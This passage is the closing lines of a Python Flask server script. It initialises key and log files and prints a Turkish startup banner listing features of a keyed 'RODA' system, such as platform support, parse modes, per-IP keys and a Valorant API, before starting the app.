    if not os.path.exists(KEYS_FILE):
        save_keys({})
    if not os.path.exists(LOGS_FILE):
        save_logs([])

    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - TAM SİSTEM (TURUNCU TEMA)                       ║
    ║     Render üzerinde çalışıyor                                 ║
    ║     Admin Key: Gizlidir                                       ║
    ║     ✅ 20 Platform | ✅ 2 Parse Modu | ✅ Webhook             ║
    ║     ✅ 1 Key = 1 IP | ✅ Admin Log Sistemi                   ║
    ║     ✅ Key Süresi: Dakika/Saat/Gün                           ║
    ║     ✅ Valorant API Aktif                                    ║
    ║     ✅ Login Düzeltildi (onclick)                            ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)

    app.run(host="0.0.0.0", port=port, debug=False)
